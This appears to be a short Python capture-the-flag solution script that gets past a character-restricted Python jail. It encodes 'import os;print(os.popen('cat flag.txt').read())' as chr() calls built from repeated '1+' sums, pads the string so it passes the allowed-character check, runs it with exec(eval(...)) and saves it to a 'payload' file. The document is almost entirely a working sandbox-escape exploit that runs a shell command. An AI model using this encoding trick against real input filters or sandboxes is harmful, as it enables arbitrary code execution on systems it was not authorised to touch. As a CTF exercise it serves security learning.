desired = "import os;print(os.popen('cat flag.txt').read())"
#desired = "1"
def addTo(n):
    return ("1+" * n)[:-1]

output = "\'\'.join(("
for c in desired:
    output += "chr(" + addTo(ord(c)) + "),"

output += "))"

output = output + " or '1<rjhniocd()_[]+yremlsp,. '"


import string

allowed = set("'1<rjhniocd()_'[]+yremlsp,. ")

code = output

if set(code) != allowed:
    raise Exception("No no no! Only: \"1<rjhniocd()_'[]+yremlsp,. \" allowed")

exec(eval(code))

f = open("payload", "w")
f.write(code)
print(output)
f.close()
